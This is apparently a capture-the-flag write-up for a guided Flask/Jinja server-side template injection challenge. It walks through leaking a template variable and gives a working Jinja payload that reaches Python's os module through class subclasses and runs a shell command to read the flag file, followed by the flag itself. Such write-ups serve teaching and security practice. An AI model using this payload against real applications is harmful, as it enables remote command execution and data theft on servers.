## About the Challenge
This is a guided SSTI challenge. The challenge uses Flask/Jinja, with a clear SSTI vulnerability.
![babyssti](/static/writeups/photos/babyssti1.png)

## Solve Process
We can follow the instructions of the challenge by first leaking the hackerman variable. 
```python
{{hackerman}}
```

It then tells us that the flag is located at /app/flag.txt. 
![location](/static/writeups/photos/babyssti2.png)

There are many ways to read the flag. I will be using the same payload as I have used in my [View Source](/#/writeups/19) writeup:
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cat flag.txt").read()}}{%endif%}{% endfor %}
```

In essence, the above searches for the **os** library in python, then runs the **popen** command to read the flag file. We will be using a similar process for the [SSTI golf](/#/writeups/40) challenge later.

## Flag
```
blahaj{SsT1_ExpL01T}
```

## Resources
[Server Side Template Injection (HackTricks)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) <br/>
[View Source](/#/writeups/19) <br/>
[SSTI Golf](/#/writeups/40)